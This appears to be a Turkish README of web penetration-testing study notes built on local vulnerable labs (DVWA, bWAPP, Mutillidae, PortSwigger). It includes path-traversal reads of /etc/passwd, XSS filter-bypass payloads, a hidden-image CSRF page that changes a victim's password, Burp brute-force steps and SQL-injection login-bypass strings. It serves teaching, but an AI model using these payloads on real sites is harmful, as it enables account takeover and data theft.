- Yoksa ```Burpsuite intercept is on```diyerek görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2013.31.02.jpeg)

- Linux sunucularında çoğunlukla ```apache``` kullanılır ve websitesi kodları ```/var/www/html``` içerisinde bulunur
- URL sonunda bulunan ```message.txt```'nin nerde olduğunu bulursak ```cd ..``` ve ```cd``` komutlarıyla dolaşıp başka dosyalara erişim sağlayabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2013.38.43.jpeg)

- Link sonuna ```../``` ekleyerek geri gitmeyi deniyoruz. Kaç tane geri gideceğimizi bilmiyoruz ve ```../``` sonuna ```/etc/passwd``` ekliyoruz
- Ya da ```?page=/etc/passwd``` şeklinde yazabiliriz çünkü ```../``` sitede filtrelenmiş ve çalışmıyor olabilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2013.47.54.jpeg)

> ## DotDotPwn

- DotDotPwn bizim manuel olarak denediğimiz seçenekleri bizim yerimize dener ve hangi seçenekleri deneyebileceğimizide gösterir
- ```apt-get install dotdotpwn``` ile yüklüyoruz
- ```dotdotpwn``` çalıştırabileceğimiz kodları gösterir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2014.06.55.jpeg)

  - ```-m```: Ne ile çalışacağımızı söyleriz (hhtp vb)
  - ```-h```: Taradığımız websitesi linki
  - ```-O```: Sunucunun işletim sistemini anlamaya çalışır (genelde linux kullanılır)
  - ```-d```: Kaç tane ".../" deneyeceğimizi söyleriz 
  - ```-S```: Site https ise belirtmemizi sağlar

- ```dotdotpwn -m http -m 192.168.123.123/bWAPP/directory_traversal_1.php?page=message.txt``` testi başlatır ve Reports klasörü içine kayıt eder
- Açık olan kısımlar ```VULNERABLE!``` olarak çıkar

# XSS Açıkları

> ## XSS Reflected Get

- ```HTML``` açığına benziyor fakat XSS'de sitde ```JS kodu``` çalıştırmayı deniyoruz
- Bu açığı ```BEEF``` ile birleştirerek hedef browser'ları hackeleyebiliriz
- Genellikle ```<script>alert("hacked")</script>``` kodunu deneriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/63363176489464eabac5425aa7a2920f627c16fd/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.20.35.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.21.39.jpeg)

- Bazen kodda bulunan bazı şeyler filtrelenmiş olabilir ```<script>``` gibi. O zaman kodu farklı şekilde yazmayı deneriz, Örneğin; ```<ScRipT>alert("hacked")</ScRipT>``` şeklinde yazabiliriz
- Bulana kadar başka kodları deneriz
- Google'a ```XSS-Payloads``` yazarak denenilebilecek diğer kodları görebiliriz

> ## XSS Reflected medium

- ```<ScRiPt>alert(1)</sCriPt>``` deneriz
- ```</script><script>alert(1)</script>``` deneriz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.23.13.jpeg)

> ## XSS Reflected Ajax Json

- Burpsuite açıyoruz
- ```intercept is on``` diyoruz
- Linkte herhangi bir bilgi görünmüyor ama ```burpsuite``` kullanarak yakalabiliriz. ```GET``` isteği yolluyor ve ```title=movies...``` şeklinde yolluyor
- ```script``` kodlarının çalışmadığı durumlarda ```<img src=a oneerror?alert(hacked)``` deneyebiliriz. Bu kod a kaynağından fotoğraf yükler ve yükleme esnasında bir hata olursa ```oneerror```'u bastırır. Bu kod içine javascript kodu koyabiliriz
- Site linkini başkasına yollarken siteden tamamına erişemediğimiz için yine ```burpsuite intercept is on``` içinde görebilriz ve o kısımı yollayabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.38.17.jpeg)

> ## XSS Stored

- Blog benzeri birşeyler kaydedebileceğimiz sitelerde çalışır
- O sayfaya giren herkes o saldırıya uğrar
- Yine ```<script>alert("hacked")</script>``` vb kodları deneriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.45.49.jpeg)

# Broken Access Control

- Erişimlerin yanlış uygulanması açığıdır

> ## Broken Auth Insecure Login Form

- Sağ tık yapıp ```view source``` diyerek HTML kodlarına bakıyoruz
- ```Source code``` içine kullanıcı adı ve şifre gizlemişler
- CTF'ler ve mülekatlar dışında çok fazla karşımıza çıkmaz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.47.26.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.48.25.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.49.29.jpeg)

> ## Broken Auth Logout Management

- Çıkış yaptıktan sonra geri tuşuna basıp geri session içine giriyorsa açık vardır
 
> ## Broken Auth Administrative Portals low level

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.55.27.jpeg)

- Bu sayfa kilitli diyor
- URL içinde ```.php?admin=0``` kısmını ```.php?admin=1``` yaparsak sorun çözülecektir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.55.14.jpeg)

- URL içinde yoksada ```Burpsuite intercept is on``` yaparak ulaşabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-12%20at%2014.58.11.jpeg)

> ## Broken Auth Administrative Portals Cookie

```Burpsuite intercept is on``` yaparak yakalayarak ```cookie``` kısmından ```admin=0```'i ```admin=1``` yaparak açabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.04.56.jpeg)


# IDOR Insecure Direct Object References

- Kullanıcıdan bir girdi aldığımız sitelerde geçerli bir açıktır (Şifre, Şifre hatırlatma metni vb.)

> ## Insecure DOR Change Secret

- ```Burpsuite intercept is on``` yapıyoruz 
- Sitemize dönüp sayfayı yeniliyoruz
- ```Request Body Parameters``` içinde 3 değişken bulunur
- Bu parametreleri değiştirerek başka kullanıcıların secret bilgilerini değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.15.51.jpeg)

> ## Insecure DOR Reset Secret

- Parametre olarak atanmayan değerlerde HTML kodundaki ```login``` kısmını değiştirerek başka kullanıcıların secret bilgilerini değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.18.05.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.19.51.jpeg)

> ## Insecure DOR Order Ticket

- Alışveriş sitesi vb sitelerde görülür
- ```Burpsuite intercept is on``` yapıyoruz
- Bilet sayısını giriyoruz ve ```Burpsuite``` üzerinden yakalıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.24.31.jpeg)

- ```ticket_quantity``` ve ```ticker_price``` parametrelerini değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.26.43.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.27.03.jpeg)
# Portswigger

- [Portswigger.com](https://portswigger.net/) içinde deneme yapabileceğimiz lablar bulunan site

> ## Başkasının Chat Geçmişini Okuma

- [Portswigger.com](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references) sitesine giriyoruz 
- ```Live chat``` kısmına giriyoruz
- ```View transcript``` diyerek mesaj geçmişini PC'mize indirebiliriz. Bu sitede "2.txt" den başlıyor
- ```Burpsuite intercept is on``` diyoruz
- Yakaladığımız bağlantı bilgileri içerisinde ```2.txt``` içeren birşeyler arıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.48.36.jpeg)

- Onu değiştirerek ```forward```'lıyoruz. Bu sayede başka kullanıcıların konuşma geçmişini elde edebiliriz
- Bu site için ```1.txt``` yaparak daha eski konuşma bilgilerine erişebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/f116de0108c07c72664554d1f3241aca05d50e76/Pictures/WhatsApp%20Image%202022-09-12%20at%2015.49.13.jpeg)

# Metasploitable 2 DataBase Değiştirme

- ```metasploitable 2``` açıyoruz
- ```sudo nano /var/www/html/config.inc``` açıyoruz
- ```$dbname=`metasploit`;``` yerine ```$db=`owasp10`;``` yazıyoruz

# Mutillidae Cookie

- Siteye sağ tıklayıp ```inspect``` diyoruz
- ```Storage``` kısmında ```cookie```ler bulunur
- ```uid (unique ID)``` aynı kullanıcı adına sahip kişileri ayırmamızı sağlar
- ```uid```'i değiştirerek başka kullanıcılara erişebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.56.54.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.16.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.58.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2010.57.51.jpeg)

- ! Google'dan "cookie manager firefox" diyerek cookie editleme eklentileri ekleyebiliriz

# CSRF Cross Site Requset Forgery

- ```CSRF``` istek yapmanın sahtekarlığıdır
- Yapılan isteklerin başka kullanıcılar için manipüle edilmesidir
- Genellikle şifre değiştirirken karşımıza çıkar

> ## CSRF Mutillidae

- ```Burpsuite intercept is on``` yapıyoruz 
- Bloga yazı yazıp yolluyoruz ve burpsuite'den yakalıyoruz
- Yakaladığımız parametreleri değiştirmeyi deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.07.59.jpeg)

- ```uid```'yi 1 yapıyoruz ve bloga admin adıyla yazmayı deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.08.18.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.08.29.jpeg)

> ## CSRF DVWA

- ```Burpsuite intercept is on``` yapıyoruz
- Şifremizi yazıp burpsuite üzerinden yakalıyoruz ve parametrelere bakıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.12.25.jpeg)

- ```Burpsuite```'den yakaladıktan sonra sağ tıklıyoruz ve ```send to repeater``` diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.22.15.jpeg)

- ```Repeater``` yollanan isteğin cevabını hızlıca görmemizi sağlar
- 2 şifreyi aynı girince şifremiz değişiyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.25.24.jpeg)

- 2 şifreyi birbirinden farklı olarak değiştiriyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.26.07.jpeg)

- Şimdi acaba ```GET request``` linkini başkasına yollayıp o linke tıklanırsa hedef kullanıcın şifresi değişir mi onu deniyoruz
- Sağ tık yaparak ```copy URL``` diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2012.50.45.jpeg)

- Yolluyoruz ve linke tıklayınca tıklayan kullanıcın şifresi linkte belirlenen şifre oluyor

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2011.33.04.jpeg)

> ## CSRF Link ile Hackleme

- Bu linki başkasına yolladığımız zaman şifresinin değiştiğini anlayabilir bunun için web sayfası oluşturuyoruz
- ```<img style="display::none", src="http://192.168.126.132/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change", alt="">``` kodunu site kodları içine yerleştiriyoruz
- Hazır sitelerin HTML kodlarının içine ekleyebiliriz
```
<!DOCTYPE html>
<html>
	<body>
		
		<img style="display::none", src="http://192.168.126.132/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change", alt="">
	
	
	</body>

</html>
```
- Kodlarıyla açılcak site beyaz ekran olur ama yinede şifre değişir
- ```display::none``` dersek açılan sayfada görünmez
- Artık içinde bu kodu bulunduran siteye tıklayan kişilerin şifresi linkte belirlenen şifreyle değiştirilir

# Brute Force 

- Bir kullanıcının şifresini deneyerek bulma yöntemidir

> ## Şifre Bulma

- ```Burpsuite intercept is on``` diyoruz
- Detaylara bakıyoruz GET isteği yolluyor
- Burpsuite'e sağ tıklayarak ```sent to intruder``` diyoruz
- ```Position``` içinden parametreleri beliyoruz
  - ```Clear``` diyerek temizliyoruz ve neyi test ediceksek onu seçiyoruz ve ```add```diyoruz
  - Saldırı tipini belirliyoruz (```Sniper``` tek bir parametreyi test ederken kullanılır)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2012.53.14.jpeg)
  
- ```Payloads``` içinden denenicek kelimeleri ayarlıyoruz
  - ```Payload set:1``` diyoruz çünkü 1 şeyi seçtik ve onu deniyeceğiz ( 2 tane olması için sniper'ı değiştirmemiz gerekiyor)
  - ```Payload type: normal list``` seçiyoruz
  - ```Payload options: load``` diyoruz ve wordlistimizi seçiyoruz ```/usr/share/wordlist``` içinde hazır wordlistler bulunur
    - ```rockyou.txt``` içinde binlerce şifre bulunur
    - ```fasttrack.txt``` içinde en çok kullanılan 200-250 şifer bulunur
  - ```Add``` diyerek ekstra şifre ekleyebiliriz
- ```Attack``` diyoruz ve saldırıyı başlatıyoruz
- Hangi şifrenin doğru olduğunu direkt söylemiyor
- ```Status```'a bakıyoruz
  - ```200```: Bir cevap aldım
  - ```404```: Bulunamadı
  - ```500```: Server cevap vermedi 
- ```Length```' bakıyoruz. Length'i büyük olana tıklıyoruz ve ```response```'unu inceliyoruz. ```welcome to the password protected area admin``` bu sitede şifre doğru demektir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.03.13.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.09.56.jpeg)

> ## Kullanıcı Adı ve Şifre Bulma

- Kullanıcı adınıda bilmiyorsak 
- ```Burpsuite intercept is on``` diyoruz giriş yapıp yakalıyoruz
- Sağ tık yaparak ```send to intruder``` diyoruz
- ```Kullanıcı adını ve şifreyi``` seçiyoruz
- Saldırı tipini ```Cluster Bomb``` seçiyoruz
- ```Payload set 1``` içine kullanıcı adı wordlistini ya da kendi istediğimiz kullanıcı adlarını giriyoruz
- ```Payload set 2``` içine şifre wordlist'lerini ekliyoruz
- ```Attack``` diyoruz ve deneyemeye başlıyor 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.52.39.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/64bdf99b83e686a60fa8be19c2c761151c9e01aa/Pictures/WhatsApp%20Image%202022-09-13%20at%2013.52.27.jpeg)

# SQL 

- Genel olarak bir websitesi veya bir sunucu içindeki veritabanında kullanılır
- Birçok yerde kullanılır (web development, mobil oyun dev.) ama genellikle sunucudan veri çekmek için kullanılır
- En çok karşılaşılan ve en tehlikeli açık türüdür
- [Sqliteonline](https://sqliteonline.com/) sitesinden online sql komutları test edilebilir
- SQL yapısı excel'e benzer

# SQL Komutları

> ## Tablo Listeleme
- "*" her şey anlamına gelir
- ```SELECT * FROM demo;```: Demo tablosu içerisindeki tüm kayıtları çağırır 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2016.57.39.jpeg)

> ## Tablo Oluşturma

- ```CREATE TABLE IF NOT EXIST test (id INTEGER PRIMARY KEY, name VARCHAR, age INTEGER);``` Eğer "test" isminde tablo yoksa "test" isminde tablo oluşturur (Primary Key id'nin otomatik 1'er 1'er artmasını sağlar)

> ## Tabloya Veri Ekleme

- ```INSERT INTO test (name,age) VALUES ('Ahmet',25);```: Tablo içerisine name'i "Ahmet" age'i 25 olan bir veri yerleştirir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.28.24.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.29.57.jpeg)

> ## Tablo Filtreleme

- ```SELECT * FROM test WHERE id=1;```: id'si 1 olan kullanıcıyı gösterir
- ```SELECT * FROM test WHERE name='Tarkan';```: İsimi tarkan olan kullanıcıyı gösterir
- ```SELECT * FROM test WHERE name LIKE 'P%';```: Test tablosunun name sütununda "P" ile başlayanları gösterir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.33.35.jpeg)

- ```SELECT * FROM test WHERE name LIKE '%N';```: Test tablosunun name sütununda "N" ile b,tenleri gösterir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.33.49.jpeg)

> ## Tablo Güncelleme

- ```UPDATE test SET age=38 WHERE name='Tarkan';```: İsimi tarkan olanların yaşını 38 olarak günceller
- ```UPDATE test SET age=22 WHERE id=1;```: id'si 1 olanın yaşını 22 olarak günceller

> ## Tablodan Veri Silme

- ```DELETE FROM test WHERE id=2;```: id'si olanın verilerini siler

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2017.39.37.jpeg)

> ## 2 Tabloyu Birlikte Listeleme

- ```SELECT FROM test UNION SELECT * FROM demo;```: 2 tabloyu birleştirerek gösterir
- Test tablosunun sütun isimlerine göre listelenir
- 2 tablodaki sütun sayısının aynı olması gerekir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2018.14.18.jpeg)

![](![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2018.30.14.jpeg))

> ## Tablodaki Sütun Sayısını Bulma

- Sunucuda kaç tane sütun olduğunu bilmediğimiz durumlarda "*" kaldırıyoruz ve onun yerine 1,2,3,4... koyuyoruz
- ```SELECT * FROM test2 UNION SELECT 1,2,3,4 FROM test``` şeklinde tek tek deniyoruz ve kaç tane sütun olduğunu buluyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.09.37.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.11.33.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.09.52.jpeg)

> ## Tablodaki Verileri Çekme 

- ```SELECT * FROM test2 UNION SELECT id,2,3,name FROM test;``` şeklinde tahmin yapabiliriz. 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.16.02.jpeg)

- ```SELECT * FROM test2 UNION SELECT id,2,3,name FROM test;``` şeklinde yazabiliriz sadece name içindeki veriler 3. sütunda listelenir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.16.17.jpeg)

- "Name" yerine e-mail vs yazıp test yapabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/1ebcb78df309bd44041194829dcff4253345ef67/Pictures/WhatsApp%20Image%202022-09-14%20at%2020.16.41.jpeg)

# SQL Injection

> ## SQL Post Methodu

- Kullanıcı adı: Jamess ve Şifre yerine "'" koyuyoruz ve deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2017.47.44.jpeg)

- ```Diagnotic Information``` kısmında bulunan kodu not alıyoruz
- ```SELECT * FROM account WHERE username='jamess' AND password='''``` olduğunu görüyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2017.49.07.jpeg)

- ```SELECT * FROM account WHERE username='jamess' AND password='123456' AND 1=1#``` deniyoruz, eğer sisteme giriş yapabilirsek SQL enjeksiyonu yapabiliriz demektir
 
  - | Kullanıcı Adı | jamess |
    | --- | --- |
    | Password | 123456' AND 1=1# |
  - ```#``` Sonrasında yazılan kodu çalıştırmaz, bazı sitelerde ```#``` engellenmiş olabilir o durumlarda ```--```'da aynı işe yarar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.07.20.jpeg)

> ## SQL Şifre Girmeden Login Olma

- ```SELECT * FROM account WHERE username='jamess' AND password='123456' OR 1=1#``` deniyoruz, yani;
- Böyle durumlarda kullanıcı adının bir önemi yoktur id'si 1 olan kullanıcı olarak giriş yaparız ve genellikle bu kişi admin olur

- | Kullanıcı Adı | jamess |
  | --- | --- |
  | Password | abcd' OR 1=1# |

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.12.10.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.32.14.jpeg)

- Bu sefer kullanıcı adı üzerinden işlem yapıyoruz ve ```SELECT * FROM account WHERE username='jamess'# AND password='abvdsb'``` deniyoruz, yani;

- | Kullanıcı Adı | jamess'# |
  | --- | --- |
  | Password | avbc |

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.06.51.jpeg)

> ## Daha Güvenli Sitelerde SQL Açığı

- ```Burpsuite``` kullanıyoruz 
- ```Intercept is on``` yapıyoruz, siteye kullanıcı adı ve şifre giriyoruz
- Eğer yolladığımız bilgiler engellenip burpsuite düşmüyorsa ```clientside``` kısmında kontrol ediliyor sunucuya gitmiyor demektir
- Girmeyi denediğimiz fakat site tarafından engellenen şifreleri ```burpsuite -> parametre``` kısmından değiştirebilir ve öyle rahatça giriş yapabiliriz
- Password kısmına ```1' OR 1=1#``` giriyoruz
- Sitede filtreleme olmuş olsa bile bu yöntemle giriş yapabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.28.28.jpeg)

# SQL Get Methodu

- URL üzerinden değişiklik yaptığımız yöntemdir ancak yine giriş ekranıda kullanılabilir
- Yollanılan parametreler URL üzerinden bize gösterilir

- | Kullanıcı Adı | jamess'# |
  | --- | --- |
  | Password | 123 |

- ```http://192.168.123.122/mutillidae/index.php?page=user-info.php&username=jamess%27%23&password=123&user-info-php-submit-button=View+Account+Details``` şekline URL'de görülür
- ```Burpsuite decoder``` kısmında yazıları istediğimiz formatda görüntüleyebiliriz
- ```Encode``` seçilen formata çevirir
- ```Decode``` seçilen formattan geri çeviri
- Bu yöntemle HTML, URL vb şeyleri kırabiliriz
  - ```%27``` : "'"
  - ```%23``` : "#"
  - ```%20``` : (boşluk) 

